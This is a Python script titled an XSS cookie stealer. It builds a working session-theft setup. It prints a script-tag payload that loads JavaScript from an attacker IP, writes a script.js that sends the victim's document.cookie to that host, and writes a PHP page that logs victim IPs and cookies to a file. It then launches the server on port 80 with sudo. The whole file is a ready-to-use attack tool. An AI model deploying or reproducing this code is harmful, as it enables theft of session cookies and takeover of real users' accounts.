import os
import sys
import subprocess

def show_help():
    print("""
Usage: python3 xss-cookie-stealer.py <IP>

Options:
  -h, --help    Show this help message and exit

Description:
  This script creates a web-server directory containing an 'index.php' and a 'script.js' for capturing cookies. 
  It then starts a PHP server on port 80 to serve these files.

Steps:
  1. Provide the IP address as a parameter, and the script will echo the payload.
  2. The payload will be:
     <script src="http://<IP>/script.js"></script>
  3. The script will create a directory named 'web-server' and set up the PHP server.
    """)

def create_web_server(ip):
    # Echo the payload instead of saving it to a file
    payload = f'<script src="http://{ip}/script.js"></script>'
    print(f"Payload: {payload}")

    # Create the 'web-server' directory
    os.makedirs("web-server", exist_ok=True)

    # Create the script.js file with the provided IP
    script_js_content = f"new Image().src='http://{ip}/index.php?c='+document.cookie;"
    with open("web-server/script.js", "w") as script_js_file:
        script_js_file.write(script_js_content)

    # Create the index.php file
    index_php_content = """<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\\n");
        fclose($file);
    }
}
?>"""
    with open("web-server/index.php", "w") as index_php_file:
        index_php_file.write(index_php_content)

    # Notify user
    print(f"Files created successfully in the 'web-server' directory.")

    # Start the PHP web server with sudo privileges
    try:
        subprocess.run(["sudo", "php", "-S", "0.0.0.0:80", "-t", "web-server"], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error starting PHP server: {e}")
        sys.exit(1)

if __name__ == "__main__":
    if len(sys.argv) == 2 and (sys.argv[1] == "-h" or sys.argv[1] == "--help"):
        show_help()
        sys.exit(0)
    
    if len(sys.argv) != 2:
        print("Error: Missing IP address.")
        show_help()
        sys.exit(1)

    ip = sys.argv[1]
    create_web_server(ip)
